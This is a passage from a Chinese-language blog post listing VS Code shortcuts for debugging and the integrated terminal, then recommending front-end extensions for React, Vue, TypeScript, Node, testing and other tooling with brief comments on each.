align="left">Ctrl + K v</td><td align="left">在边栏打开渲染后的视图【新建】</td></tr></tbody></table><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><table><thead><tr><th align="left">快捷键</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">F9</td><td align="left">添加解除断点</td></tr><tr><td align="left">F5</td><td align="left">启动调试、继续</td></tr><tr><td align="left">F11 / Shift + F11</td><td align="left">单步进入 / 单步跳出</td></tr><tr><td align="left">F10</td><td align="left">单步跳过</td></tr><tr><td align="left">Ctrl + K Ctrl + I</td><td align="left">显示悬浮</td></tr></tbody></table><h3 id="集成终端"><a href="#集成终端" class="headerlink" title="集成终端"></a>集成终端</h3><table><thead><tr><th align="left">快捷键</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">Ctrl + `</td><td align="left">打开集成终端</td></tr><tr><td align="left">Ctrl + Shift + `</td><td align="left">创建一个新的终端</td></tr><tr><td align="left">Ctrl + Shift + C</td><td align="left">复制所选</td></tr><tr><td align="left">Ctrl + Shift + V</td><td align="left">复制到当前激活的终端</td></tr><tr><td align="left">Shift + PgUp / PgDown</td><td align="left">页面上下翻屏</td></tr><tr><td align="left">Ctrl + Home / End</td><td align="left">滚动到页面头部或尾部</td></tr></tbody></table><h2 id="前端适用插件"><a href="#前端适用插件" class="headerlink" title="前端适用插件"></a>前端适用插件</h2><h3 id="功能性"><a href="#功能性" class="headerlink" title="功能性"></a>功能性</h3><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dformulahendry.auto-close-tag" target="_blank" rel="noopener">Auto Close Tag </a>: 匹配标签，关闭对应的标签。很实用【HTML/XML】</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dformulahendry.auto-rename-tag" target="_blank" rel="noopener">Auto Rename Tag</a>: sublime和webstorm也有这个内置功能，改变标签的时候同时改动开闭合标签；【HTML/XML】</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DHookyQR.beautify" target="_blank" rel="noopener">beautify</a>: 良好的拓展性，可以格式化<code>JSON|JS|HTML|CSS|SCSS</code>,比内置格式化好用</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dformulahendry.code-runner" target="_blank" rel="noopener">Code Runner </a>: 代码编译运行看结果，支持众多语言</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dkamikillerto.vscode-colorize" target="_blank" rel="noopener">colorize</a>: 会给颜色代码增加一个当前匹配代码颜色的背景，非常好</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Djoelday.docthis" target="_blank" rel="noopener">Document This </a>: JSDOC注解调用，值得易用</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Ddonjayamanne.githistory" target="_blank" rel="noopener">Git History </a>: 不得不赞的插件，谁用谁知道，功能很赞</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Decmel.vscode-html-css" target="_blank" rel="noopener">HTML CSS Support </a>: 这个也是必备插件之一</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dchristian-kohler.path-intellisense" target="_blank" rel="noopener">Path Autocomplete </a>: 路径智能补全</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dchristian-kohler.path-intellisense" target="_blank" rel="noopener">Path Intellisense </a>： 路径智能提示.</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dmrmlnc.vscode-scss" target="_blank" rel="noopener">SCSS IntelliSense Preview</a>: SCSS智能提醒，配置强大</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dnonoroazoro.syncing" target="_blank" rel="noopener">Syncing</a>: 这个同步插件要比官方市场那个最高下载量的要好，支持删除同步！！！</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dpflannery.vscode-versionlens" target="_blank" rel="noopener">Version Lens </a>: 可以及时看到<code>package.json</code>内部版本的变动，很实用</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DIBM.output-colorizer" target="_blank" rel="noopener">Output Colorizer </a>: 可以终端日志输出着色，实用</li></ul><h3 id="React"><a href="#React" class="headerlink" title="React"></a>React</h3><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Ddsznajder.es7-react-js-snippets" target="_blank" rel="noopener">ES7 React/Redux/GraphQL/React-Native snippets</a>:最好用的<code>snippet</code>汇总,非常全面,墙裂推荐!!!</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dka05.react-explorer-addons" target="_blank" rel="noopener">react-explorer-addons</a>: 增加鼠标右键直接生成react的组件模板,好不好用,用过的才知道</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DOfHumanBondage.react-proptypes-intellisense" target="_blank" rel="noopener">React PropTypes Intellisense</a>: React props的智能提示</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Djpoissonnier.vscode-styled-components" target="_blank" rel="noopener">vscode-styled-components</a>: 对<code>styled-componnents</code>的支持,高亮包括智能提示</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Djonkwheeler.styled-components-snippets" target="_blank" rel="noopener">styled-components-snippets</a>: <code>styled-components</code>的代码片段</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dsuming.react-proptypes-generate" target="_blank" rel="noopener">React PropTypes Generate</a>: 一键生成<code>react</code>的<code>proptypes</code>, 不用<code>ts</code>的小伙伴必备</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dmohsen1.react-javascript-to-typescript-transform-vscode" target="_blank" rel="noopener">React JavaScript to TypeScript Transformer for VSCode</a>: <code>React</code>的<code>js</code>版本转<code>ts</code>版本,有些瑕疵,但可用</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dvsmobile.vscode-react-native" target="_blank" rel="noopener">React Native Tools</a>: 让 <code>vscode</code>可以写 RN 的插件,包括调试!</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DNuclleaR.vscode-extension-auto-import" target="_blank" rel="noopener">Auto Import - ES6, TS, JSX, TSX</a>: 这个插件是作者在一个长期不更新的项目加以维护的,类似智能补全的,基本跟进主流</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Digorming.useful-react-snippets" target="_blank" rel="noopener">Useful React Snippets</a>: React的snippet</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DEQuimper.react-native-react-redux" target="_blank" rel="noopener">React-Native/React/Redux snippets for es6/es7</a>:这个是比较重量级的插件，而且作者更新很勤快</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dabotteram.typescript-react-snippets" target="_blank" rel="noopener">Typescript React/Redux Snippets</a>：<code>ts</code>语法的<code>react</code>代码片段</li></ul><h3 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h3><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DShaofeiZi.vscode-vue-typescript-snippets" target="_blank" rel="noopener">Vue TypeScript Snippets</a>: 针对<code>vue</code>的<code>ts</code>代码片段</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dpresidentma.axios-snippets" target="_blank" rel="noopener">Axios Snippets</a>: <code>axios</code>的默认<code>api</code>智能提示,<code>ts/html/js/vue</code>都支持..不支持<code>react</code>(看它的发包<code>json</code>)</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dlingximu.vusion-peek" target="_blank" rel="noopener">vusion peek</a> : <code>Vue</code>组件快速跳转(<code>Peek</code>)</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dprograhammer.tslint-vue" target="_blank" rel="noopener">TSLint Vue</a>: 让tslint 支持<code>vue</code>单组件内 <code>ts</code>的语法</li></ul><h3 id="Typescript"><a href="#Typescript" class="headerlink" title="Typescript"></a>Typescript</h3><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dsalbert.comment-ts" target="_blank" rel="noopener">Comments in Typescript</a>: 针对<code>TS</code>的注释插件,基于<code>JSDoc</code>定制</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Drexebin.classio" target="_blank" rel="noopener">Class IO</a>: 可以显示引用类相关的关系(在代码编辑区域显示一个对应的标志位)</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Drexebin.classlens" target="_blank" rel="noopener">ClassLens</a>: 快速跳转到类的相关引用</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DMaxGotovkin.tslens" target="_blank" rel="noopener">TSLens</a>: <code>tslens</code>的gutter,可以让你更直观的看到不同类型的引用,支持五种类型</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dkisstkondoros.typelens" target="_blank" rel="noopener">TypeLens </a>: 类型引用索引展示，用过<code>visual studio</code>的都看到过，相当强大的一个功能；换个名词可能更多人知道，<code>peek file</code></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dpmneo.tsimporter" target="_blank" rel="noopener">TypeScript Import </a>: 专门处理TS内模块导入的，和第一个互补；</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dtypings.vscode-typings" target="_blank" rel="noopener">Typings </a>: 这个就是用来处理<code>d.ts</code>的</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dms-vscode.typescript-javascript-grammar" target="_blank" rel="noopener">Latest TypeScript and Javascript Grammar </a>:完美的支持beta及稳定版本的TS语法；</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DMariusAlchimavicius.json-to-ts" target="_blank" rel="noopener">JSON to TS</a>:有了这个来声明和后台协商的对接接口简直不能再方便了【<code>typescript interface</code>】</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dsteoates.autoimport" target="_blank" rel="noopener">Auto Import </a>: 对于一堆组件的我们来说，这货简直贴心，支持JSX和typescript，还有一些细致化的配置参数</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dcapaj.vscode-exports-autocomplete" target="_blank" rel="noopener">exports autocomplete </a>: 和上个功能类似但是不等同，相当实用</li></ul><h3 id="GraphQL"><a href="#GraphQL" class="headerlink" title="GraphQL"></a>GraphQL</h3><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DPrisma.vscode-graphql" target="_blank" rel="noopener">GraphQL</a>: 让VS Code支持<code>GraphQL</code></li></ul><h3 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h3><ul><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Daxetroy.vscode-npm-import-package-version" target="_blank" rel="noopener">npm-import-package-version</a>: 在引入模块的时候直接展示该模块的版本,很实用!!</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Datian25.eggjs" target="_blank" rel="noopener">eggjs</a>: 蛋框的相关帮助插件,代码片段,智能提示等</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Degg-jump-definition.egg-jump-definition" target="_blank" rel="noopener">egg-jump-definition</a>: 蛋框的函数跳转</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dchristian-kohler.npm-intellisense" target="_blank" rel="noopener">npm Intellisense</a>: 正如标题所说,在写引入模块的时候智能提示!!</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dreflectiondm.npmsmartimporter" target="_blank" rel="noopener">NPM Smart Importer</a>: 与上个的插件的差异是智能补全,比如你 copy 了一些代码,而木有引入部分模块!可以点击引入!</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dherrmannplatz.npm-dependency-links" target="_blank" rel="noopener">NPM Dependency Links</a>: 这个就是方便你在初始化脚手架项目之后想了解某些模块,点击直接调到npm 模块发布页面…省去了打开浏览器,搜索….</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dgurayyarar.expressjs-4-snippets" target="_blank" rel="noopener">ExpressJs 4 Snippets</a>: 如标题所言,里面汇总了70个片段,基本是 ES6的语法的!!</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Damandeepmittal.pug" target="_blank" rel="noopener">Pug</a>: 这是模板语言的代码片段,严格来说并不属于 <code>node</code>,问题这货基本用于服务端渲染的模板语言,一般和 node 的服务端框架搭配…</p></li></ul><h3 id="微信小程序"><a href="#微信小程序" class="headerlink" title="微信小程序"></a>微信小程序</h3><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dbanxi.mpvue-snippets" target="_blank" rel="noopener">mpvue snippets</a>: <code>mpvue</code>的一些代码片段,以及部分原生小程序的代码提示</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dqiu8310.minapp-vscode" target="_blank" rel="noopener">minapp</a>: 用<code>VS Code</code>写小程序必备的插件,里面有众多实用的特性集成</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dqiu8310.minapp-vscode" target="_blank" rel="noopener">minapp</a> : 写原生微信小程序必备的插件,智能补全,函数跳转等等</li></ul><h3 id="代码测试"><a href="#代码测试" class="headerlink" title="代码测试"></a>代码测试</h3><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DjsTestGen.js-test-gen-vscode" target="_blank" rel="noopener">js-test-gen-vscode</a>: 可以针对部分函数直接生成jest单元测试代码</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DOrta.vscode-jest" target="_blank" rel="noopener">Jest</a>: 让你写<code>Jest</code>代码有IDE的感觉</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dhbenl.vscode-mocha-test-adapter" target="_blank" rel="noopener">Mocha Test Explorer</a>: 针对<code>mocha</code>测试的GUI话,会给编辑器多一个独立的版块</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dryanluker.vscode-coverage-gutters" target="_blank" rel="noopener">Coverage Gutters</a>: 可以直观的看到你代码覆盖率的区域</li></ul><h3 id="代码质量把控"><a href="#代码质量把控" class="headerlink" title="代码质量把控"></a>代码质量把控</h3><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dkisstkondoros.vscode-codemetrics" target="_blank" rel="noopener">CodeMetrics</a>: 可以计算TS/JS内代码的复杂度(比如函数这些),这些与代码质量和性能是挂钩的</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dwix.vscode-import-cost" target="_blank" rel="noopener">Import Cost</a>: 就是你import一个东西的时候,可以计算改引入模块的大小!!!厉害吧</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Desbenp.prettier-vscode" target="_blank" rel="noopener">Prettier</a>: 这个东西在github上挺火,可以支持很多种新框架的格式,高度自定义,所以有人封装成了插件..实用!(vue,ng,react,jsx,ts)这些格式化毫无压力</li></ul><h3 id="代码可视化改善"><a href="#代码可视化改善" class="headerlink" title="代码可视化改善"></a>代码可视化改善</h3><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dpnp.polacode" target="_blank" rel="noopener">Polacode</a>: 生成精美的代码截图,很漂亮,根据你当前主题配色生成的</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Djaspernorth.vscode-pigments" target="_blank" rel="noopener">vscode-pigments</a>: 代码页面展示颜色代码并展示对应的颜色,非常实用</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dnickdemayo.vscode-json-editor" target="_blank" rel="noopener">Json Editor</a>: 非常实用的可视化<code>JSON</code>编辑,不容错过</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Drafamel.subtle-brackets" target="_blank" rel="noopener">Subtle Match Brackets</a>:快速高亮你配置的闭合,对于聚焦我们的光标区块代码很有帮助</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dritwickdey.LiveServer" target="_blank" rel="noopener">vscode-live-server</a>: 非常全面的HTML预览工具,支持众多实际开发需要的特性,比如<code>https</code>,<code>代理</code>,<code>cros</code></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Deverettjf.filter-line" target="_blank" rel="noopener">Filter Line</a>: 对于处理日志文件,可以快速筛选出我们需要聚焦的内容</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Daaron-bond.better-comments" target="_blank" rel="noopener">Better Comments</a>: 最好用的注释区域高亮,对于TODO这些支持也很好</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dbierner.emojisense" target="_blank" rel="noopener">:emojisense:</a>: 可配置化(针对语言),智能提示emoji,非常实用..走过路过不要错过</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dsatokaz.vscode-markdown-header-coloring" target="_blank" rel="noopener">Markdown Header Coloring</a>: 给<code>Markdown</code>的标题区域添加一个亮瞎眼的颜色…</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Ddanields761.status-bar-breadcrumb" target="_blank" rel="noopener">BreadCrumb in StatusBar</a>: 面包屑的支持,在底部状态栏展示</li></ul><h3 id="改善编码体验"><a href="#改善编码体验" class="headerlink" title="改善编码体验"></a>改善编码体验</h3><ul><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dvscodevim.vim" target="_blank" rel="noopener">Vim</a>: 王牌插件,让<code>vscode</code>支持<code>vim</code>的常用特性,还集成几种常用<code>vim</code>插件的特性,喜欢的不容错过</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dpredrag-nikolic.php-class-helper" target="_blank" rel="noopener">Class Helper</a>: 对<code>class</code>快速编辑,支持<code>ts,js,php</code></p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dmads-hartmann.bash-ide-vscode" target="_blank" rel="noopener">Bash IDE</a>: 对<code>bash</code>提供类似IDE的体验,跳转,智能提示这些</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dzhoufeng.json-helper" target="_blank" rel="noopener">JSON Helper</a>: 提供大纲功能,可以快速跳转编辑</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Djerrygoyal.shortcut-menu-bar" target="_blank" rel="noopener">Shortcut Menu Bar</a>: 把几个很常用的行为做成图标内置在编辑区域内,对于非快捷键熟练的小伙伴有所用处</p></li><li><p><a href>YAML Support by Red Hat Preview</a>: 涵盖了对<code>YAML</code>的校验,智能提示,对于用这个写配置文件的很有用处</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Doderwat.indent-rainbow" target="_blank" rel="noopener">indent-rainbow</a>: 会给缩进添加一种颜色,让你更加直观的看到代码层次</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dakashrajendra.web-search" target="_blank" rel="noopener">Web Search</a>: 选择代码内容,快速跳转到搜索引擎,支持<code>Google, DuckDuckGo, StackOverflow</code>三种引擎,打开的是默认本地浏览器</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dtomoki1207.pdf" target="_blank" rel="noopener">vscode-pdfviewer</a>: 让<code>VS Code</code>可以阅读<code>PDF</code>文档,支持目录这些</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dfabiospampinato.vscode-projects-plus" target="_blank" rel="noopener">Projects+</a>: 项目管理必备插件,可以快速录入本地项目的地址,打开..非常实用</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Djeremyljackson.vs-docblock" target="_blank" rel="noopener">VS DocBlockr</a>: <code>Atom</code>插件<code>Docblockr</code>移植版,非常好用的注释插件</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DVisualStudioExptTeam.vscodeintellicode" target="_blank" rel="noopener">Visual Studio IntelliCode - Preview</a>: 提供AI支持(强化你的代码智能提示),微软出品</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dsleistner.vscode-fileutils" target="_blank" rel="noopener">File Utils</a>: 非常实用的一个文件工具集,脱离鼠标,直接操作当前打开的页面.</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dimbhargav5.npm-ui" target="_blank" rel="noopener">npm-ui</a>: 侧边栏添加npm图标,npm菜单内可以直接执行命令</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dlukaserat.npm-scripts" target="_blank" rel="noopener">NPM Scripts</a>: 命令行执行npm命令 ,可以算是<code>npm ui</code>的非UI版本</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dyatki.vscode-surround" target="_blank" rel="noopener">Surround</a>: 快速包裹代码并且添加对应的条件语句,很实用</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DOBKoro1.korofileheader" target="_blank" rel="noopener">koroFileHeader</a>: 快速添加注解到文件头部(预定义模板),比如创建时间,谁创建的</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Drubbersheep.gi" target="_blank" rel="noopener">gi</a>: 快速生成<code>.gitignore</code></p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Djimliu7434.tea-time" target="_blank" rel="noopener">tea-time</a>: 番茄计时器!有助于改善你长期盯电脑的习惯,到点去喝杯水缓缓什么的</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DZhouSir.visual-snake-code" target="_blank" rel="noopener">Visual Snake Code</a>: 撸代码累了.来一把贪吃蛇?然后继续苦逼!</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dwhtouche.vscode-js-console-utils" target="_blank" rel="noopener">javascript console utils</a>: 快速生成<code>console.log</code>(选中)</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DChakrounAnas.turbo-console-log" target="_blank" rel="noopener">Turbo Console Log</a>: 与上面那个类似,功能弱化些</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dmwood0904.clear-console" target="_blank" rel="noopener">clear-console</a>: 快速清除当前文件内的<code>console.log</code>信息,很实用</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dbhshawon.node-json-autocomplete" target="_blank" rel="noopener">Node JSON Autocomplete</a>: 对于引入<code>json</code>文件提供智能提示</p></li></ul><h3 id="协作系列"><a href="#协作系列" class="headerlink" title="协作系列"></a>协作系列</h3><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dlostintangent.vsls-whiteboard" target="_blank" rel="noopener">VS Live Share Whiteboard</a> : <code>Live Share</code> 画板支持,这下子不仅代码能协作,思路也能演示了</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DMS-vsliveshare.vsliveshare" target="_blank" rel="noopener">VS Live Share</a> : 代码协作,会使用上面这个插件的小伙伴,肯定也会用这个插件</li></ul><h3 id="文件支持系列"><a href="#文件支持系列" class="headerlink" title="文件支持系列"></a>文件支持系列</h3><ul><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DGizmos.docs-yaml" target="_blank" rel="noopener">docs-yaml</a> : 提供<code>yaml</code>的智能补全和语法校验功能</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dmikestead.dotenv" target="_blank" rel="noopener">DotENV</a> : <code>env</code>文件的支持</li></ul><h3 id="工具篇"><a href="#工具篇" class="headerlink" title="工具篇"></a>工具篇</h3><ul><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DIgorSbitnev.error-gutters" target="_blank" rel="noopener">Error Gutters</a>: 会把错误显示为图标,类似<code>git gutter</code>,一目了然</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dericadamski.carbon-now-sh" target="_blank" rel="noopener">carbon-now-sh</a>: 快速生成漂亮的代码图片</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DCoenraadS.bracket-pair-colorizer-2" target="_blank" rel="noopener">Bracket Pair Colorizer 2</a>: 原作者的第二版,括号高亮匹配更快速</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DShinotatwu-DS.file-tree-generator" target="_blank" rel="noopener">file-tree-generator</a>: <code>tree</code>命令的鼠标操作版,还会输出icon符号</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dmike-co.import-sorter" target="_blank" rel="noopener">TypeScript Import Sorter</a>: 适合强迫症用户,给引入语句进行排序,可以单文件或者整个目录深度遍历</p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3DChaunceyKiwi.json-tree-view" target="_blank" rel="noopener">JSON Tree View</a>: 可视化跳转<code>json</code>,适合懒人快速定位<code>json</code>的某个<code>key</code></p></li><li><p><a href="https://link.juejin.im/?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dwaderyan.babelrc" target="_blank" 